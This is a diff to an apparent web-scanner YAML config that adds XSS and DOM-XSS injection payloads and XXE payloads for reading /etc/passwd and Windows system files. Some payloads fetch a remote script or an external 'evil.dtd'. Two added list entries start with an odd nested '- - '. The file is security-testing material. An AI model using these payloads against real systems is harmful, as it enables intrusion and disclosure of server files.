@@ -247,6 +247,30 @@ xss:
     - "{{$on.constructor('alert(\"XSS\")')()}}"
     - "{{10000000000 * 10000000000}}"
     - '<iframe src="javascript:alert(`xss`)">'
+    - - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+    - '<body onload=alert(1)>'
+    - '">><script>alert(1)</script>'
+    - '"></SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
+    - '<Img src = x onerror = "javascript: window.onerror = alert; throw 1">'
+    - '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>'
+    - '<BODY ONLOAD=alert(1)>'
+    - '<iframe/src="data:text/html,<svg onload=alert(1)>">'
+    - '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click Me!</a>' # Decimal HTML Encode
+    - '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29">Click Me</a>' # Hex Encode (No Semicolons)
+    - '<a href="jav&#x0A;ascript:alert(1);">Click Me</a>' # Embedded Newline
+    - '<details open ontoggle=alert(1)>'
+    - '<video><source onerror="javascript:alert(1)"></video>'
+    - '<input autofocus onfocus=alert(1)>'
+    - '<isindex type=image src=1 onerror=alert(1)>'
+    - '<div style="width:100%;height:100%;" onmouseover=alert(1)></div>'
+    - '<math><a xlink:href="//jsfiddle.net/1"><mi>click</mi></a></math>'
+    - '";alert(1);//'
+    - '</script><script>alert(1);</script>'
+    - '";window[''al\u0065rt''](1);//'
+    - '" autofocus onfocus="alert(1)'
+    - '" onmouseover="alert(1)'
+    - ''' onmouseenter=''alert(1)'
 
 # DOM-based XSS Configuration
 dom_xss:
@@ -276,17 +300,29 @@ dom_xss:
     - "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(\"DOMXSS\"),a')}}"
     - "{{$eval.constructor('alert(\"DOMXSS\")')()}}"
     - 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=''+/"/+/onmouseover=1/+/[*/[]/+alert(''DOMXSS'')//''>'
+    - - 'javascript:alert(1)'
+    - 'javascript://%250Aalert(1)'
+    - 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+    - 'eval(atob("YWxlcnQoMSk="))'
+    - 'setTimeout("alert(1)", 0)'
+    - 'setInterval("alert(1)", 0)'
+    - '<img src=x onerror=alert(1)>'
+    - '"><svg/onload=alert(1)>'
+    - '#<script>alert(1)</script>'
+    - '{{constructor.constructor("alert(1)")()}}'
+    - '{{$on.constructor("alert(1)")()}}'
+    - '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}'
 
 
 # XML External Entity Tester
 xxe:
-  endpoint_keywords: ["/api", "/soap", "/xml", ".xml", ".wsdl", ".rss"]
+  endpoint_keywords: ["/api", "/soap", "/xml", ".xml", ".wsdl", ".rss", "b2b", "rest", "upload"]
   payloads:
-    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
-    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
-    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>', subcategory: "SSRF via XXE" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure (Linux)" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>', subcategory: "File Disclosure (Windows)" }
+    - { payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><data>&xxe;</data></root>', subcategory: "File Disclosure" }
     - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM "http://example.com/evil.dtd"><%dtd;]><foo></foo>', subcategory: "External DTD" }
-  indicators: ["root:x:0:0:", "www-data:", "daemon:", "instance-id"]
+  indicators: ["root:x:0:0:", "www-data:", "daemon:", "instance-id", "[mci]", "[drivers]"]
 
 # API Scanner Configuration
 api:
